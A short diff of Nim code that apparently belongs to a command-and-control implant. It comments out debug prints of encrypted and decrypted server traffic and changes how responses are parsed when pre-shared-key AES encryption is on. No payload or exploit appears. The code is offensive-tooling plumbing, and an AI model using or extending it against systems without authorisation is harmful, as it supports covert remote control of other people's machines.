@@ -51,9 +51,9 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
         when not defined(release):
             echo "Just received data back from get or post request: ", result
         when defined(AESPSK):
-            echo "inside post request just received back: encrypted: ", result
+            # echo "inside post request just received back: encrypted: ", result
             result = decryptStr(curConfig.PayloadUUID, curConfig.Psk, result)
-            echo "after post request decrypted data: ", result
+            # echo "after post request decrypted data: ", result
     except:
         let
             e = getCurrentException()
@@ -151,8 +151,8 @@ proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: str
                     echo "isdownload first \n"
                     # Indicates json response needs to be parsed for file_id
                     echo "your fetchdata: ", $(fetchData)
-                    echo "fetchdata decoded: ", decode(fetchData)
-                let parsedJson = parseJson(decode(fetchData)[36 .. ^1]) 
+                    # echo "fetchdata decoded: ", decode(fetchData)
+                let parsedJson = when defined(AESPSK): parseJson(fetchData[36 .. ^1]) else: parseJson(decode(fetchData)[36 .. ^1]) 
                 when not defined(release):
                     echo "parsedJson: ", $(parsedJson)
                 for resp in parsedJson["responses"].getElems():
